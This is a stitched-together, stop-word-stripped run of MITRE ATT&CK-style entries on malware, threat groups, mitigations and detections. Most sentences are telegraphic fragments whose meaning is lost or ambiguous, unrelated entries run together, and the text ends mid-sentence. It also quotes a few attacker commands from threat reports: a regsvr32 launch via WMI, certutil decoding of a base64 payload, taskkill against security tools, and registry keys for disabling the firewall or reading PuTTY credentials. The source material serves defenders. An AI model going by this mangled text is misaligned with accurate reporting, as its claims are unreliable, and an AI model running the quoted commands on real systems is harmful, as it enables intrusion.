payloads.(Citation: Google EXOTIC LILY March 2022) [InvisiMole](https://attack.mitre.org/software/S0260) function proxy create server relays communication client C&C server, clients.(Citation: ESET InvisiMole June 2018) [AppleSeed](https://attack.mitre.org/software/S0622) divided files size 0x1000000 bytes more.(Citation: KISA Operation Muzabi) [Cobalt Strike](https://attack.mitre.org/software/S0154) determine user infected machine admin domain admin group.(Citation: Cyberreason Anchor December 2019) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Ensure proper permissions set Registry hives prevent users modifying SIP trust provider components. Components hijacked suitable functions disk malicious modifications Registry prevented.  [AppleSeed](https://attack.mitre.org/software/S0622) ability multiple dynamically resolved API calls.(Citation: Malwarebytes Kimsuky June 2021) [Emotet](https://attack.mitre.org/software/S0367) relied users clicking malicious link delivered spearphishing.(Citation: Trend Micro Banking Malware Jan 2019)(Citation: Carbon Black Emotet Apr 2019) [Exaramel Windows](https://attack.mitre.org/software/S0343) dropper creates starts Windows service named wsmprovav description “Windows Check AV.”(Citation: ESET TeleBots Oct 2018) [APT28](https://attack.mitre.org/groups/G0007) variety utilities, including WinRAR, archive collected data password protection.(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) [iKitten](https://attack.mitre.org/software/S0278) zip /Library/Keychains directory exfiltrating it.(Citation: objsee mac malware 2017) [ROKRAT](https://attack.mitre.org/software/S0240) ability gather list files directories infected system.(Citation: Securelist ScarCruft 2019)(Citation: NCCGroup RokRat Nov 2018)(Citation: Volexity InkySquid RokRAT August 2021) [SombRAT](https://attack.mitre.org/software/S0615) encrypted C2 communications AES.(Citation: BlackBerry CostaRicto November 2020) [Chimera](https://attack.mitre.org/groups/G0114) compromised domain accounts gain access target environment.(Citation: NCC Chimera January 2021) [WellMess](https://attack.mitre.org/software/S0514) encrypt POST data RC6 dynamically generated AES key encrypted hard coded RSA public key.(Citation: PWC WellMess July 2020)(Citation: PWC WellMess C2 August 2020)(Citation: CISA WellMess July 2020) [TeamTNT](https://attack.mitre.org/groups/G0139) script checks `/proc/*/environ` environment variables AWS.(Citation: Cisco Talos Intelligence Group) [HyperBro](https://attack.mitre.org/software/S0398) ability screenshots.(Citation: Unit42 Emissary Panda 2019) Review MFA actions authentication logs ensure MFA-based logins functioning intended. Update corporate policies restrict types third-party applications online service tool linked company's information, accounts network Google, Microsoft, Dropbox, Basecamp, GitHub). However, providing high-level guidance this, extremely specific—include list per-approved applications deny list. Administrators block end-user consent administrative portals, Azure Portal, disabling users authorizing third-party apps OAuth forcing administrative consent.(Citation: Azure Admin Consent) Monitor debugger logs signs abnormal malicious activity. [Starloader](https://attack.mitre.org/software/S0188) masqueraded legitimate software update packages Adobe Acrobat Reader Intel.(Citation: Symantec Sowbug Nov 2017) [InvisiMole](https://attack.mitre.org/software/S0260) inject process avoid detection including technique called ListPlanting customizes sorting algorithm ListView structure.(Citation: ESET InvisiMole June 2020) [Kimsuky](https://attack.mitre.org/groups/G0094) mshta.exe malicious scripts system.(Citation: EST Kimsuky April 2019)(Citation: CISA AA20-301A Kimsuky)(Citation: Crowdstrike GTR2020 Mar 2020)(Citation: KISA Operation Muzabi) Monitor AppCertDLLs Registry modifications correlate software, patch cycles, etc. [WellMess](https://attack.mitre.org/software/S0514) execute command scripts received C2.(Citation: PWC WellMess July 2020) [Anchor](https://attack.mitre.org/software/S0504) establish persistence creating service.(Citation: Cyberreason Anchor December 2019)	 [CharmPower](https://attack.mitre.org/software/S0674) delete created files compromised system.(Citation: Check APT35 CharmPower January 2022) [WhisperGate](https://attack.mitre.org/software/S0689) download execute AdvancedRun.exe `sc.exe`.(Citation: Medium S2W WhisperGate January 2022)(Citation: Unit 42 WhisperGate January 2022) [Bundlore](https://attack.mitre.org/software/S0482) ability enumerate browser version Safari.(Citation: MacKeeper Bundlore Apr 2019) [QakBot](https://attack.mitre.org/software/S0650) stored stolen emails data folders prior exfiltration.(Citation: Kroll Qakbot June 2020) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [Tropic Trooper](https://attack.mitre.org/groups/G0081) base64 encoding hide command strings delivered C2.(Citation: TrendMicro Tropic Trooper 2020) [POWERSTATS](https://attack.mitre.org/software/S0223) PowerShell obfuscation execution.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: ClearSky MuddyWater Nov 2018)(Citation: TrendMicro POWERSTATS V3 June 2019)(Citation: DHS CISA AA22-055A MuddyWater February 2022) Network intrusion detection prevention systems identify traffic patterns indicative AiTM activity mitigate activity network level. [HotCroissant](https://attack.mitre.org/software/S0431) ability retrieve list files directory drives drive types.(Citation: Carbon Black HotCroissant April 2020) [ZxShell](https://attack.mitre.org/software/S0412) disable firewall modifying registry key <code>HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile</code>.(Citation: Talos ZxShell Oct 2014)  [UNC2452](https://attack.mitre.org/groups/G0118) C2 data exfiltration.(Citation: Volexity SolarWinds) [Ragnar Locker](https://attack.mitre.org/software/S0481) VirtualBox stripped Windows XP virtual machine itself. shared folder configuration enables [Ragnar Locker](https://attack.mitre.org/software/S0481) encrypt files host operating system, including files mapped drives.(Citation: Sophos Ragnar 2020) (Citation: Cybereason OperationCuckooBees 2022) Establish organizational policy prohibits password storage files. [Aria-body](https://attack.mitre.org/software/S0456) encrypted configuration file loader.(Citation: CheckPoint Naikon 2020) [BLINDINGCAN](https://attack.mitre.org/software/S0520) modified file directory timestamps.(Citation: US-CERT BLINDINGCAN Aug 2020)(Citation: NHS BLINDINGCAN Aug 2020) [Penquin](https://attack.mitre.org/software/S0587) sniff network traffic packets matching specific conditions.(Citation: Leonardo Turla Penquin 2020)(Citation: Kaspersky Turla Penquin December 2014) Monitor interactions network shares, reads file transfers, remote services Server Message Block (SMB). [InvisiMole](https://attack.mitre.org/software/S0260) gather mapped drives, OS version, name, DEP policy, memory size, volume serial number.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) (Citation: Scarlet Mimic Jan 2016) [Darkhotel](https://attack.mitre.org/groups/G0012) malware time compromised host.(Citation: Lastline DarkHotel Time Decryption Nov 2015) onfigure intrusion prevention devices detect SNMP queries commands unauthorized sources. Create signatures detect Smart Install (SMI) usage sources trusted director.(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018) [Chaes](https://attack.mitre.org/software/S0631) unsigned, crafted DLL module named <code>hha.dll</code> designed legitimate 32-bit Windows DLL.(Citation: Cybereason Chaes Nov 2020) Monitor executed commands arguments actions attempt running processes system. [HermeticWiper](https://attack.mitre.org/software/S0697) multiple Windows API functions privilege escalation, service execution, overwrite random bites data.(Citation: SentinelOne Hermetic Wiper February 2022)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: ESET Hermetic Wizard March 2022)(Citation: Qualys Hermetic Wiper March 2022) [FunnyDream](https://attack.mitre.org/software/S1044) ScreenCap component screenshots compromised host.(Citation: Bitdefender FunnyDream Campaign November 2020) [APT29](https://attack.mitre.org/groups/G0016) conducted credential theft operations credentials access victim environments.(Citation: CrowdStrike StellarParticle January 2022) [KONNI](https://attack.mitre.org/software/S0356) hardcoded API calls functions victim's machine.(Citation: Malwarebytes Konni Aug 2021)  impact generated golden ticket, reset built-in KRBTGT account password twice, invalidate existing golden tickets created KRBTGT hash Kerberos tickets derived it.(Citation: ADSecurity Kerberos KRBTGT) domain, change KRBTGT account password once, force replication, change password time. rotating KRBTGT account password 180 days.(Citation: STIG krbtgt reset) Monitor windows registry values establish persistence elevate privileges mechanisms trigger execution based specific events. execution, [Threat Group-3390](https://attack.mitre.org/groups/G0027) malware deobfuscates decompresses code encoded Metasploit’s shikata_ga_nai encoder compressed LZNT1 compression.(Citation: Securelist LuckyMouse June 2018) [FIN7](https://attack.mitre.org/groups/G0046) created custom video recording capability monitor operations victim's environment.(Citation: FireEye FIN7 Aug 2018)(Citation: DOJ FIN7 Aug 2018) [RedLeaves](https://attack.mitre.org/software/S0153) receive execute commands cmd.exe. provide reverse shell.(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: FireEye APT10 April 2017) [TrailBlazer](https://attack.mitre.org/software/S0682) requests C2.(Citation: CrowdStrike StellarParticle January 2022) [GALLIUM](https://attack.mitre.org/groups/G0093) ensured payload unique hash, including types packers.(Citation: Cybereason Soft Cell June 2019) [Mosquito](https://attack.mitre.org/software/S0256)’s installer obfuscated custom crypter obfuscate installer.(Citation: ESET Turla Mosquito Jan 2018) [Melcoz](https://attack.mitre.org/software/S0530) ability steal credentials browsers.(Citation: Securelist Brazilian Banking Malware July 2020) [APT29](https://attack.mitre.org/groups/G0016) social media platforms hide communications C2 servers.(Citation: ESET Dukes October 2019) [Elderwood](https://attack.mitre.org/groups/G0066) delivered zero-day exploits malware victims injecting malicious code specific public visited targets sector.(Citation: Symantec Elderwood Sept 2012)(Citation: CSM Elderwood Sept 2012)(Citation: Security Affairs Elderwood Sept 2012) [Fox Kitten](https://attack.mitre.org/groups/G0117) PuTTY Plink tools lateral movement.(Citation: CISA AA20-259A Iran-Based Actor September 2020) [PLAINTEE](https://attack.mitre.org/software/S0254) performs <code>tasklist</code> command list running processes.(Citation: Rancor Unit42 June 2018) Allowlist MIB objects implement SNMP views. Disable Smart Install (SMI) used.(Citation: Cisco Securing SNMP)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)  [Bisonal](https://attack.mitre.org/software/S0268) relied users execute malicious file attachments delivered spearphishing emails.(Citation: Talos Bisonal Mar 2020)  [TajMahal](https://attack.mitre.org/software/S0467) set <code>KeepPrintedJobs</code> attribute configured printers <code>SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\Printers</code> enable document stealing.(Citation: Kaspersky TajMahal April 2019) Routinely monitor user permissions ensure expected users capability modify cloud compute infrastructure components. [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>New-UserPersistenceOption</code> Persistence argument establish [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053).(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) [Wingbird](https://attack.mitre.org/software/S0176) services.exe register autostart service named "Audit Service" local lsass.exe file.(Citation: SIR 21)(Citation: Wingbird Nov 2017) [Kobalos](https://attack.mitre.org/software/S0641) exfiltrate credentials network UDP.(Citation: ESET Kobalos Feb 2021)  [TrickBot](https://attack.mitre.org/software/S0266) retrieved PuTTY credentials querying <code>Software\SimonTatham\Putty\Sessions</code> registry key (Citation: TrendMicro Trickbot Feb 2019) [FoggyWeb](https://attack.mitre.org/software/S0661)'s loader <code>load()</code> function load [FoggyWeb](https://attack.mitre.org/software/S0661) dll Application Domain compromised FS server.(Citation: MSTIC FoggyWeb September 2021) payload [CozyCar](https://attack.mitre.org/software/S0046) encrypted simple XOR rotating key. [CozyCar](https://attack.mitre.org/software/S0046) configuration file encrypted RC4 keys.(Citation: F-Secure CozyDuke) [LightNeuron](https://attack.mitre.org/software/S0395) capable executing commands cmd.exe.(Citation: ESET LightNeuron 2019) [SILENTTRINITY](https://attack.mitre.org/software/S0692) module conduct Kerberoasting.(Citation: GitHub SILENTTRINITY Modules July 2019) [SDBbot](https://attack.mitre.org/software/S0461) ability image file execution options persistence detects running admin privileges Windows version Windows 7.(Citation: Proofpoint TA505 October 2019) 
Identify block unnecessary utilities malicious software schedule tasks whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) [BadPatch](https://attack.mitre.org/software/S0337) download execute update malware.(Citation: Unit 42 BadPatch Oct 2017) [REvil](https://attack.mitre.org/software/S0496) infected victim machines compromised websites exploit kits.(Citation: Secureworks REvil September 2019)(Citation: McAfee Sodinokibi October 2019)(Citation: Picus Sodinokibi January 2020)(Citation: Secureworks GandCrab REvil September 2019) [PowerDuke](https://attack.mitre.org/software/S0139) hides backdoor payloads alternate data stream (ADS).(Citation: Volexity PowerDuke November 2016) [HyperStack](https://attack.mitre.org/software/S0537) add communication pipe <code>HKLM\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters\NullSessionPipes</code>.(Citation: Accenture HyperStack October 2020) [Kimsuky](https://attack.mitre.org/groups/G0094) exfiltrated data C2 channel.(Citation: Securelist Kimsuky Sept 2013)(Citation: Talos Kimsuky Nov 2021) [QakBot](https://attack.mitre.org/software/S0650) conduct brute force attacks capture credentials.(Citation: Kroll Qakbot June 2020)(Citation: Crowdstrike Qakbot October 2020)(Citation: Kaspersky QakBot September 2021) Monitor API calls attempt listing network connections compromised accessing remote systems querying network. [Ragnar Locker](https://attack.mitre.org/software/S0481) attempted services business applications databases release lock files applications encrypted.(Citation: Sophos Ragnar 2020) Monitor newly constructed files manipulate external outcomes hide activity [ROKRAT](https://attack.mitre.org/software/S0240) retrieve additional malicious payloads C2 server.(Citation: Talos ROKRAT)(Citation: NCCGroup RokRat Nov 2018)(Citation: Volexity InkySquid RokRAT August 2021)(Citation: Malwarebytes RokRAT VBA January 2021) [FIN7](https://attack.mitre.org/groups/G0046) port-protocol mismatches ports 53, 80, 443, 8080 C2.(Citation: FireEye FIN7 Aug 2018) [APT28](https://attack.mitre.org/groups/G0007) macro command <code>certutil -decode</code> decode contents .txt file storing base64 encoded payload.(Citation: Unit 42 Sofacy Feb 2018)(Citation: Palo Alto Sofacy 06-2018) Remove users local administrator systems. [Peppy](https://attack.mitre.org/software/S0643) identify specific files exfiltration.(Citation: Proofpoint Operation Transparent Tribe March 2016) [Psylo](https://attack.mitre.org/software/S0078) commands enumerate storage devices files start string.(Citation: Scarlet Mimic Jan 2016) [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) capability processes services.(Citation: CISA MAR SLOTHFULMEDIA October 2020) [SUNBURST](https://attack.mitre.org/software/S0559) digitally signed SolarWinds March - 2020.(Citation: FireEye SUNBURST Backdoor December 2020) [PROMETHIUM](https://attack.mitre.org/groups/G0056) disguised malicious installer files bundling legitimate software installers.(Citation: Talos Promethium June 2020)(Citation: Bitdefender StrongPity June 2020) Ensure agent forwarding disabled systems explicitly require feature prevent misuse. (Citation: Symantec SSH ssh-agent) [Crimson](https://attack.mitre.org/software/S0115) set Registry key determine installed version number.(Citation: Proofpoint Operation Transparent Tribe March 2016) [APT3](https://attack.mitre.org/groups/G0022) exploited Adobe Flash Player vulnerability CVE-2015-3113 Internet Explorer vulnerability CVE-2014-1776.(Citation: FireEye Clandestine Wolf)(Citation: FireEye Clandestine Fox) [Clambling](https://attack.mitre.org/software/S0660) ability Telnet communication.(Citation: Trend Micro DRBControl February 2020) [Downdelph](https://attack.mitre.org/software/S0134) RC4 encrypt C2 responses.(Citation: ESET Sednit 3) [InvisiMole](https://attack.mitre.org/software/S0260) launch remote execute commands.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) Monitor executed commands arguments brute force techniques gain access accounts passwords unknown password hashes obtained. Monitor logging, messaging, artifacts cloud services. [Turla](https://attack.mitre.org/groups/G0010) WMI event filters consumers establish persistence.(Citation: ESET Turla PowerShell 2019) (Citation: Crowdstrike GTR2020 Mar 2020) [KONNI](https://attack.mitre.org/software/S0356) registered service export function.(Citation: Malwarebytes Konni Aug 2021)  Adversaries direct [BACKSPACE](https://attack.mitre.org/software/S0031) upload files C2 Server.(Citation: FireEye APT30) [Leafminer](https://attack.mitre.org/groups/G0077) [Process Doppelgänging](https://attack.mitre.org/techniques/T1055/013) evade security software deploying tools compromised systems.(Citation: Symantec Leafminer July 2018)	 [STARWHALE](https://attack.mitre.org/software/S1037) VBScript function `GetRef` persistence mechanism.(Citation: Mandiant UNC3313 Feb 2022) [Crimson](https://attack.mitre.org/software/S0115) command collect victim MAC address LAN IP.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020) [Sandworm Team](https://attack.mitre.org/groups/G0034) temporarily disrupted service Georgian government, non-government, private sector websites compromising Georgian hosting provider 2019.(Citation: District Court Indictment GRU Unit 74455 October 2020) [Sandworm Team](https://attack.mitre.org/groups/G0034) distributed [NotPetya](https://attack.mitre.org/software/S0368) compromising legitimate Ukrainian accounting software M.E.Doc replacing legitimate software update malicious one.(Citation: Secureworks NotPetya June 2017)(Citation: ESET Telebots June 2017)(Citation: District Court Indictment GRU Unit 74455 October 2020) Disallow loading remote DLLs. included default Windows Server 2012+ patch XP+ Server 2003+.

Enable Safe DLL Search Mode force search DLLs directories restrictions (e.g. <code>%SYSTEMROOT%</code>)to local directory DLLs (e.g. user's directory)

The Safe DLL Search Mode enabled Policy Configuration > [Policies] > Administrative Templates > MSS (Legacy): MSS: (SafeDllSearchMode) Enable Safe DLL search mode. Windows Registry key located <code>HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\SafeDLLSearchMode</code>(Citation: DLL)(Citation: Dynamic Link Library Search Order) [TA459](https://attack.mitre.org/groups/G0062) VBScript execution.(Citation: Proofpoint TA459 April 2017) [POWERSTATS](https://attack.mitre.org/software/S0223) retrieve IP, network adapter configuration information, domain compromised hosts.(Citation: FireEye MuddyWater Mar 2018)(Citation: TrendMicro POWERSTATS V3 June 2019) [WindTail](https://attack.mitre.org/software/S0466) ability macOS built-in zip utility archive files.(Citation: objective-see windtail2 jan 2019) [LookBack](https://attack.mitre.org/software/S0582) sets Registry key establish persistence mechanism.(Citation: Proofpoint LookBack Malware Aug 2019) [LazyScripter](https://attack.mitre.org/groups/G0140) downloaded additional tools compromised host.(Citation: MalwareBytes LazyScripter Feb 2021) [FIN10](https://attack.mitre.org/groups/G0051) relied publicly-available software gain footholds establish persistence victim environments.(Citation: FireEye FIN10 June 2017) [Anchor](https://attack.mitre.org/software/S0504) obfuscated code stack strings string encryption.(Citation: Cyberreason Anchor December 2019) Apply patch KB2962486 prevents credentials stored GPPs.(Citation: ADSecurity Finding Passwords SYSVOL)(Citation: MS14-025) Collecting disk resource filenames binaries, comparing InternalName, OriginalFilename, ProductName match expected, provide leads indicative malicious activity. (Citation: Elastic Masquerade Ball) [LightNeuron](https://attack.mitre.org/software/S0395) collect files local system.(Citation: ESET LightNeuron 2019) [Whitefly](https://attack.mitre.org/groups/G0107) simple remote tool C2 server wait commands.(Citation: Symantec Whitefly March 2019) Variants [Kevin](https://attack.mitre.org/software/S1020) communicate C2 HTTP.(Citation: Kaspersky Lyceum October 2021) Monitor newly constructed services/daemons attempt hide artifacts behaviors evade detection. [Daserf](https://attack.mitre.org/software/S0187) encrypted Windows APIs encrypts data alternative base64+RC4 Caesar cipher.(Citation: Trend Micro Daserf Nov 2017) [HermeticWizard](https://attack.mitre.org/software/S0698) WMI create process remote machine `C:\windows\system32\cmd.exe /c start C:\windows\system32\\regsvr32.exe /s /iC:\windows\<filename>.dll`.(Citation: ESET Hermetic Wizard March 2022) [Green Lambert](https://attack.mitre.org/software/S0690) proxies C2 traffic.(Citation: Objective Green Lambert OSX Oct 2021)(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021) [FIN8](https://attack.mitre.org/groups/G0061) deleted tmp prefetch files post compromise cleanup activities.(Citation: FireEye Enemy FIN8 Aug 2016) (Citation: ESET Sednit 3)(Citation: Symantec APT28 Oct 2018)(Citation: District Court Indictment GRU Oct 2018)(Citation: Secureworks IRON TWILIGHT Active Measures March 2017) [Valak](https://attack.mitre.org/software/S0476) clientgrabber module steal e-mail credentials Registry.(Citation: SentinelOne Valak June 2020) Ensure application component binaries signed correct application developers.  [ChChes](https://attack.mitre.org/software/S0144) capable downloading files, including additional modules.(Citation: Palo Alto menuPass Feb 2017)(Citation: JPCERT ChChes Feb 2017)(Citation: FireEye APT10 April 2017) monitoring file locations installation application software components paths applications typically load extensible components. [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors script WMI queries check VM sandbox running, including VMWare Virtualbox. script WMI determine cores allocated system; script execution.(Citation: Talos Frankenstein June 2019) [nbtstat](https://attack.mitre.org/software/S0102) discover local NetBIOS domain names. (Citation: DHS CISA AA22-055A MuddyWater February 2022) [DarkWatchman](https://attack.mitre.org/software/S0673) TLS encrypt C2 channel.(Citation: Prevailion DarkWatchman 2021) Monitor Launch Agent creation additional plist files utilities Objective-See’s KnockKnock application.  [HotCroissant](https://attack.mitre.org/software/S0431) ability services infected host.(Citation: Carbon Black HotCroissant April 2020) [Linfo](https://attack.mitre.org/software/S0211) creates backdoor remote attackers retrieve list running processes.(Citation: Symantec Linfo 2012) Traffic traversing [Tor](https://attack.mitre.org/software/S0183) network forwarded multiple nodes exiting [Tor](https://attack.mitre.org/software/S0183) network continuing intended destination.(Citation: Dingledine Tor Second-Generation Onion Router) [Gorgon Group](https://attack.mitre.org/groups/G0078) malware attempt disable security features Office Windows Defender <code>taskkill</code> command.(Citation: Unit 42 Gorgon Aug 2018) [APT29](https://attack.mitre.org/groups/G0016) stolen user's saved passwords Chrome.(Citation: CrowdStrike StellarParticle January 2022) 
Monitor newly constructed network connections Windows Remote Management (WinRM), remote WMI connection attempts (typically port 5985 5986 HTTPS). flood volumes exceed capacity network connection targeted, typically intercept incoming traffic upstream filter attack traffic legitimate traffic. defenses hosting Internet Service Provider (ISP) 3rd party Content Delivery Network (CDN) providers specializing DoS mitigations.(Citation: CERT-EU DDoS March 2017)

Depending flood volume, on-premises filtering blocking source addresses sourcing attack, blocking ports targeted, blocking protocols transport.(Citation: CERT-EU DDoS March 2017)

As response require rapid engagement 3rd parties, analyze risk critical resources Network DoS attacks create disaster recovery plan/business continuity plan respond incidents.(Citation: CERT-EU DDoS March 2017) [APT29](https://attack.mitre.org/groups/G0016) dynamic DNS resolution construct resolve randomly-generated subdomains C2.(Citation: Volexity SolarWinds) [RawPOS](https://attack.mitre.org/software/S0169) dumps memory specific processes victim system, parses dumped files, scrapes credit card data.(Citation: Kroll RawPOS Jan 2017)(Citation: TrendMicro RawPOS April 2015)(Citation: Mandiant FIN5 GrrCON Oct 2016) [Milan](https://attack.mitre.org/software/S1015) custom protocol tunneled DNS HTTP.(Citation: Kaspersky Lyceum October 2021) [HELLOKITTY](https://attack.mitre.org/software/S0617) WMI delete volume shadow copies.(Citation: FireEye FiveHands April 2021) [Bisonal](https://attack.mitre.org/software/S0268) appended random binary data generate binary.(Citation: Talos Bisonal Mar 2020)  [Green Lambert](https://attack.mitre.org/software/S0690) add [Login Items](https://attack.mitre.org/techniques/T1547/015) establish persistence.(Citation: Objective Green Lambert OSX Oct 2021)(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021)  [Valak](https://attack.mitre.org/software/S0476) ability identify domain MAC IP addresses infected machine.(Citation: Cybereason Valak 2020) [Zeus Panda](https://attack.mitre.org/software/S0330) launch remote scripts victim’s machine.(Citation: GDATA Zeus Panda June 2017)	 [Doki](https://attack.mitre.org/software/S0600) resolved path process PID script argument.(Citation: Intezer Doki July 20) [Patchwork](https://attack.mitre.org/groups/G0040) created self-signed certificates fictitious spoofed legitimate software companies sign malware.(Citation: Unit 42 BackConfig 2020) [ShadowPad](https://attack.mitre.org/software/S0596) collected PID malicious process.(Citation: Kaspersky ShadowPad Aug 2017) [Turla](https://attack.mitre.org/groups/G0010) encrypted files stolen connected USB drives RAR file exfiltration.(Citation: Symantec Waterbug Jun 2019) [DnsSystem](https://attack.mitre.org/software/S1021) upload files infected machines receiving command `uploaddd` string.(Citation: Zscaler Lyceum DnsSystem June 2022) (Citation: DFIR Conti Bazar Nov 2021) [APT39](https://attack.mitre.org/groups/G0087) screen capture utility screenshots compromised host.(Citation: Symantec Chafer February 2018)(Citation: FBI FLASH APT39 September 2020) Password stealer NTLM stealer modules [CozyCar](https://attack.mitre.org/software/S0046) harvest stored credentials victim, including credentials Windows NTLM user authentication.(Citation: F-Secure CozyDuke) Monitor newly executed processes exploit software vulnerabilities attempt elevate privileges. [EXOTIC LILY](https://attack.mitre.org/groups/G1011) contact forms victim websites generate phishing e-mails.(Citation: Google EXOTIC LILY March 2022) Ensure developers administrators aware risk plaintext passwords software configuration files left endpoint systems servers. [Windows Credential Editor](https://attack.mitre.org/software/S0005) dump credentials.(Citation: Amplia WCE) [CharmPower](https://attack.mitre.org/software/S0674) communicate C2.(Citation: Check APT35 CharmPower January 2022) Deny remote local admin credentials log systems. domain user accounts local Administrators multiple systems. [FrameworkPOS](https://attack.mitre.org/software/S0503) identifiy payment card track data victim local file subdirectory C:\Windows\.(Citation: FireEye FIN6 April 2016) [Hydraq](https://attack.mitre.org/software/S0203) creates backdoor remote attackers monitor services.(Citation: Symantec Trojan.Hydraq Jan 2010)(Citation: Symantec Hydraq Jan 2010) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) exploited Office vulnerabilities CVE-2014-4114, CVE-2018-0802, CVE-2018-0798 execution.(Citation: Symantec Tick Apr 2016)(Citation: Trend Micro Tick November 2019) (Citation: Unit 42 MuddyWater Nov 2017)(Citation: TrendMicro POWERSTATS V3 June 2019) [TA551](https://attack.mitre.org/groups/G0127) DGA generate URLs executed macros.(Citation: Unit 42 TA551 Jan 2021)(Citation: Secureworks GOLD CABIN) Users trained identify social engineering techniques spearphishing emails malicious links. [DanBot](https://attack.mitre.org/software/S1014) VBA macro embedded Excel file drop payload.(Citation: SecureWorks August 2019) [ShadowPad](https://attack.mitre.org/software/S0596) DNS tunneling C2 communications.(Citation: Kaspersky ShadowPad Aug 2017) Monitor third-party application logging, messaging, artifacts target resource intensive features applications denial service (DoS). addition network level detections, endpoint logging instrumentation detection. Attacks targeting applications generate logs server, application server, database server identify type attack, impact felt. Externally monitor availability services targeted Endpoint DoS. [ZxShell](https://attack.mitre.org/software/S0412) create service service parser function ProcessScCommand.(Citation: Talos ZxShell Oct 2014)  [Waterbear](https://attack.mitre.org/software/S0579) query Registry key <code>"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI"</code> `OracleOcilib` exists.(Citation: Trend Micro Waterbear December 2019) [BBSRAT](https://attack.mitre.org/software/S0127) delete files directories.(Citation: Palo Alto Networks BBSRAT) [SMOKEDHAM](https://attack.mitre.org/software/S0649) delivered malicious links phishing emails.(Citation: FireEye Shining Light DARKSIDE 2021) discovery modules [Duqu](https://attack.mitre.org/software/S0038) collect network connections.(Citation: Symantec W32.Duqu) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors `net group` command advanced reconnaissance.(Citation: Cybereason OperationCuckooBees 2022) [FunnyDream](https://attack.mitre.org/software/S1044) identify configured proxies compromised network C2 communication.(Citation: Bitdefender FunnyDream Campaign November 2020) [LaZagne](https://attack.mitre.org/software/S0349) perform credential dumping MSCache account password information.(Citation: GitHub LaZagne Dec 2018) [Lazarus Group](https://attack.mitre.org/groups/G0032) custom hashing method resolve APIs shellcode.(Citation: Lazarus APT January 2022) Command arguments regsvr32.exe invocation determining origin purpose script DLL loaded. (Citation: Carbon Black Squiblydoo Apr 2016) [Orz](https://attack.mitre.org/software/S0229) perform Registry operations.(Citation: Proofpoint Leviathan Oct 2017) [RogueRobin](https://attack.mitre.org/software/S0270) WMI check BIOS version VBOX, bochs, qemu, virtualbox, vm check evidence script executing analysis environment. (Citation: Unit 42 DarkHydrus July 2018)(Citation: Unit42 DarkHydrus Jan 2019) [PittyTiger](https://attack.mitre.org/groups/G0011) attempts legitimate credentials operations.(Citation: Bizeul 2014) (Citation: ESET Operation Spalax Jan 2021) [YAHOYAH](https://attack.mitre.org/software/S0388) encrypts configuration file simple algorithm.(Citation: TrendMicro TropicTrooper 2015) [Rocke](https://attack.mitre.org/groups/G0106) cleared log files /var/log/ folder.(Citation: Anomali Rocke March 2019) (Citation: NCC Chimera January 2021) [ThreatNeedle](https://attack.mitre.org/software/S0665) compressed obfuscated RC4, AES, XOR.(Citation: Kaspersky ThreatNeedle Feb 2021) [USBferry](https://attack.mitre.org/software/S0452) installer attached USB storage devices.(Citation: TrendMicro Tropic Trooper 2020) [StrongPity](https://attack.mitre.org/software/S0491) PowerShell add files Windows Defender exclusions list.(Citation: Talos Promethium June 2020) [Wizard Spider](https://attack.mitre.org/groups/G0102) network communications.(Citation: CrowdStrike Grim Spider 2019) [SideCopy](https://attack.mitre.org/groups/G1008) collected browser compromised host.(Citation: MalwareBytes SideCopy Dec 2021) [SslMM](https://attack.mitre.org/software/S0058) feature manipulate process privileges tokens.(Citation: Baumgartner Naikon 2015) [Kivars](https://attack.mitre.org/software/S0437) ability download execute files.(Citation: TrendMicro BlackTech June 2017) [Silent Librarian](https://attack.mitre.org/groups/G0122) collected lists names e-mail accounts password spraying attacks private sector targets.(Citation: DOJ Iran Indictments March 2018) [Pandora](https://attack.mitre.org/software/S0664) ability compress stings QuickLZ.(Citation: Trend Micro Iron Tiger April 2021) [APT32](https://attack.mitre.org/groups/G0050) JavaScript victim websites download additional frameworks profile compromise visitors.(Citation: Volexity OceanLotus Nov 2017) [FIVEHANDS](https://attack.mitre.org/software/S0618) embedded NTRU public key encrypt data ransom.(Citation: FireEye FiveHands April 2021)(Citation: CISA AR21-126A FIVEHANDS 2021)(Citation: NCC Fivehands June 2021) [Attor](https://attack.mitre.org/software/S0438) FTP protocol C2 communication.(Citation: ESET Attor Oct 2019) [Comnie](https://attack.mitre.org/software/S0244) encrypts command control communications RC4.(Citation: Palo Alto Comnie) [BADNEWS](https://attack.mitre.org/software/S0128) copies files extensions USB devices to
